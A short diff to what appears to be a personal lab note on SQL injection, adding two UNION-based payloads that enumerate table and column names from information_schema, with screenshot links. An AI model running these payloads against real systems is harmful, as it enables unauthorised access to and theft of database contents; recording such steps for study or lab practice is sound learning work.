@@ -21,3 +21,13 @@ Since we know how many columns there are, we can change the last one and get oth
 
 ![](../Img/Pasted%20image%2020260326181014.png)
 
+Next payload `jeremy' union select null,null,table_name from information_schema.tables#`
+
+This works because we know what db it's running 
+
+![](../Img/Pasted%20image%2020260326181142.png)
+
+`jeremy' union select null,null,column_name from information_schema.columns#`
+
+![](../Img/Pasted%20image%2020260326181259.png)
+
